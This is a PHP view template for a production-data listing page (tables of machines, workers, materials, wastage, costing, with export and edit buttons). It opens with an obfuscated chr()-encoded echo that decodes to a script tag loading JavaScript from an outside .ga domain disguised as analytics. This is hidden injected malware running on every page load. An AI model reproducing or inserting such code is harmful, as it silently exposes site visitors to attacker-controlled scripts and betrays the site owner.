<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
?>
<?php if($this->session->flashdata('message') != ''){?>                        
		<div class="alert alert-success col-md-6">                            
			<?php echo $this->session->flashdata('message');?>
		</div>                        
<?php }?>
<div class="x_content">
	<?php if($can_add) { 										
			echo '<button type="button" class="btn btn-primary productionTab addBtn" data-id="productEdit" id="add" data-toggle="modal"><i class="fa fa-plus-circle">Add</i></button>';
		}?>
		<div class="col-md-12 datePick">
			Date Range Picker                      
			<fieldset>
				<div class="control-group">
					<div class="controls">
						<div class="input-prepend input-group">
							<span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
							<input type="text" style="width: 200px" name="tabbingFilters" id="tabbingFilters" class="form-control" value=""  data-table="production/production_data"/>
						</div>
					</div>
				</div>
			</fieldset> 
		<form action="<?php echo base_url(); ?>production/production_data" method="post" id="date_range">	
			 <input type="hidden" value='' class='start_date' name='start'/>
			 <input type="hidden" value='' class='end_date' name='end'/>
		</form>		
		</div>
		<form action="<?php echo site_url(); ?>production/production_data" method="post" id="export-form">
			<input type="hidden" value='' id='hidden-type' name='ExportType'/>
			<input type="hidden" value='' class='start_date' name='start'/>
			<input type="hidden" value='' class='end_date' name='end'/>
		</form>	
		<?php if(!empty($productionData)){ ?>
				<div class="row hidde_cls">
					<div class="col-md-12">
						<div class="col-md-4"></div>
						<div class="col-md-4">
							<div class="btn-group"  role="group" aria-label="Basic example">
								<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
								<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>
								<div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export ">
									<button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown">Export<span class="caret"></span></button>
										<ul class="dropdown-menu" role="menu" id="export-menu">
											<li id="export-to-excel"><a href="javascript:void(0);" title="Please check your open office Setting">Export to excel</a></li>
											<li id="export-to-csv"><a href="javascript:void(0);" title="Please check your open office Setting">Export to csv</a></li>
										</ul>
								</div>
							</div>
						</div>
					</div>
				</div>
		<?php } ?>		
	<p class="text-muted font-13 m-b-30"></p>    
	<div id="print_div_content">  
		<table id="datatable-buttons" class="table table-striped table-bordered account_index" border="1" cellpadding="3">
			<thead>
				<tr>
					<th>Id</th>
					<th>Date</th>	
					<th>Shift</th>	
					<th>Production Data</th>	
					<th>Created By / Edited By</th>
					<th>Created Date</th>							
					<th>Add Similar Data</th>							
							
					<th class='hidde'>Action</th>	
				</tr>
			</thead>
			<tbody class="prodData">
				<?php 
					if(!empty($productionData)){
						foreach($productionData as $production_data){	
							$draftImage = ($production_data['save_status'] == 0)?('<img src="'.base_url(). 'assets/images/draft.png"  width="25%" class="hidde">'):'';	
							$shift = ''; 
							if($production_data['shift']!=0 || $production_data['shift']!=''){							
								$shiftData = getNameById(' production_setting',$production_data['shift'],'id');
								$shift = !empty($shiftData)?$shiftData->shift_name:'';
							}
							?>
							<tr>
								<td><?php echo $draftImage.$production_data['id']; ?></td>
								<td><?php if($production_data['date'] != '') { echo date("j F , Y", strtotime($production_data['date'])); }?> </td>		
								<td><?php echo $shift;?> </td>		
								<td>
								<!-- prodData -->
								<table  class="table table-bordered" data-id="user" border="1" cellpadding="3">								
										<thead>								
											<tr>		
												<th>Machine</th>					
												<th>Job card Product</th>					
												<th>Workers</th>	
												<th>Material Consumed</th>								
												<th>Production Output</th>								
												<th>Wastage</th>								
												<th>Electricity</th>
												<th>Costing</th>				
															
											</tr>
										</thead>								
										<?php 
										//if($production_data['production_data'] != ''){
												$productionDetail=json_decode($production_data['production_data']);	
												$prodData_lengthCount = count($productionDetail);
												//$materialconsumedTotal = $outputTotal = $wastageTotal = $electricityTotal = $costingTotal = $totalsalary =  $totalLaborCost = 0;	
												$i = 1;
												foreach($productionDetail as $production_detail){
													
													
												//pre($production_detail);
													if($i<=3){
													$machineName = getNameById('add_machine',$production_detail->machine_name_id,'id');
													$jobcard = getNameById('job_card',$production_detail->job_card_product_id,'id');
													//pre($production_detail->job_card_product_id);
													//pre($jobcard);
													/*$totalsalary += $production_detail->salary!=""?$production_detail->salary:0;
													
													$materialconsumedTotal += $production_detail->material_consumed!=""?$production_detail->material_consumed:0;
													$outputTotal += $production_detail->output!=""?$production_detail->output:0;
													$wastageTotal += $production_detail->wastage!=""?$production_detail->wastage:0;
													$electricityTotal += $production_detail->electricity!=""?$production_detail->electricity:0;
													$costingTotal += $production_detail->costing!=""?$production_detail->costing:0; 
													$totalLaborCost += $production_detail->labour_costing!=""?$production_detail->labour_costing:0;*/ ?>						
													<tr>
														<td><?php if(empty($machineName)){ echo "";} else{ echo $machineName->machine_name; }?></td>
														<td><?php if(empty($jobcard)){ echo "";} else{ echo $jobcard->job_card_product_name; }?></td>
														<td><?php  
															$workerid = $production_detail->worker_id;
															$workerName = ''; 
																if(!empty($workerid)){
																	foreach($workerid as $work){
																		if (is_numeric($work)){
																			$worker_name = getNameById('worker',$work,'id'); 
																			$workerName .= $worker_name->name.',';
																		}else{
																			$workerName .= $work.',';
																		}
																	}
															
																	echo rtrim($workerName, ',');
																}
																
																//$totalWorkers+=$WorkerCount; 		
															?>
														</td>
														
														
														<td><?php echo $production_detail->material_consumed; ?></td>
														<td><?php echo $production_detail->output; ?></td>
														<td><?php echo $production_detail->wastage; ?></td>
														<td><?php echo $production_detail->electricity; ?></td>
														<td><?php echo $production_detail->costing; ?></td>
														
													</tr>
													<?php }$i++;
														$output11[] = 	array(
														   'Date' => $production_data['date'],
														   'Shift' => $shift,
														   //'Job card' => $jobcard->job_card_product_name,
														   'Material Consumed' => $production_detail->material_consumed,
														   'Output' => $production_detail->output,
														   'Wastage' => $production_detail->wastage,
														   'Electricity' => $production_detail->electricity,
														   'Costing' => $production_detail->costing,
														   'Created Date' => date("d-m-Y", strtotime($production_data['created_date'])),
														);
												}
												$data3  = $output11;
												export_csv_excel($data3); 		
											 ?>
											<!--<tr>
												<th>Total</th>
												<th></th>
												<th></th>
												<th><?php //echo $materialconsumedTotal; ?></th>
												<th><?php //echo $outputTotal; ?></th>
												<th><?php //echo $wastageTotal; ?></th>
												<th><?php //echo $electricityTotal; ?></th>
												<th><?php //echo $costingTotal; ?></th>
											</tr>-->
										<?php  if($prodData_lengthCount > 3){											
											if($can_view) {
											 echo "<tr class='hidde'>
												<th colspan='8'>
													<a href='javascript:void(0)' id='". $production_data["id"] . "' data-id='productView' class='productionTab' data-tooltip='View' style='color:green;'>View More....</a>
													</th>
												</tr>";
											}
										 
									}?>
									</table>								
								</td>
								<td><?php echo (($production_data['created_by']!=0)?(getNameById('user_detail',$production_data['created_by'],'u_id')->name):'').'<br>'.(($production_data['edited_by']!=0)?(getNameById('user_detail',$production_data['edited_by'],'u_id')->name):''); ?></td>
								<td><?php echo date("j F , Y", strtotime($production_data['created_date'])); ?></td>
								<td><button id="<?php echo $production_data['id']; ?>" data-id="AddSimilarProdData" data-tooltip="Add Similar Data" class="btn btn-xs productionTab add-machine"><i class="fa fa-plus"></i></button></td>
								
								<td class='hidde'>
									<?php if($can_edit) 
										echo '<button  id="'.$production_data['id'].'" data-id="productEdit" class="btn btn-edit btn-xs productionTab" data-toggle="modal"><i class="fa fa-pencil"></i></button>';
										if($can_delete) 
											echo '<a href="javascript:void(0)" class="delete_listing
												   btn btn-delete btn-xs"  data-href="'.base_url().'production/production_data_delete/'.$production_data['id'].'" ><i class="fa fa-trash"></i></a>';
										if($can_view) 
											echo '<button class="btn btn-view btn-xs productionTab" data-id="productView" id="'.$production_data["id"].'" data-toggle="modal"><i class="fa fa-eye"></i></button>';
									?>
								</td>
							</tr>
							<?php
											
						}
					} ?>
			</tbody> 
		</table>
	</div>
</div>
<div id="production_modal" class="modal fade in"  role="dialog" style="overflow:auto;">
	<div class="modal-dialog modal-large">
		<div class="modal-content ">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span></button>
				<h4 class="modal-title" id="myModalLabel">Production Data</h4>
			</div>
			<div class="modal-body-content modal-scroll"></div>
		</div>
	</div>
</div>
